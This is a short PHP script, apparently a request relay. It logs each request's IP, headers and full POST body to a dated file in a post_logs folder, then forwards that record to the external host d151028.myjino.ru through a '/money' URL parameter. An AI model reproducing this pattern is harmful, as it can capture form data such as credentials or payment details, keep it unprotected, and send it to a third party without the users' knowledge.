<?php
  {
    $log_dir="post_logs";
    if(!is_dir($log_dir)){mkdir($log_dir);}
    $log_filename=dirname(__FILE__)."/".$log_dir."/".gmdate("Y-m-d").".log";
    $log_object=array();
    $log_object['time'] = gmdate('Y-m-d H-i-s');
    $log_object['ip'] = getenv('REMOTE_ADDR');
    $log_object['request_uri'] = getenv('REQUEST_URI');
    $log_object['user_agent'] = getenv('HTTP_USER_AGENT');
    $log_object['referrer'] = getenv('HTTP_REFERER');
    $log_object['method']=$_SERVER['REQUEST_METHOD'];
    $log_object['post']=json_encode($_POST);
    $log_string=file_exists($log_filename)?"\n":"";
    $log_string.=json_encode($log_object);
    $fd=fopen($log_filename,"a");
    fwrite($fd,$log_string);
    fclose($fd);
  }
  header("content-type:text/plain");
  ob_start();include "server/index.php";$ip_port=ob_get_clean();
  $self=rawurlencode($_SERVER['SERVER_NAME']."/".$log_object['time']);
  $event=rawurlencode(json_encode($log_object));
  $url=rawurlencode("http://$ip_port/money?serv=$self&event=$event");
  $server="http://d151028.myjino.ru/main.php";
  echo file_get_contents("$server?url=$url");
  //echo gmdate('Y-m-d H-i-s');
?>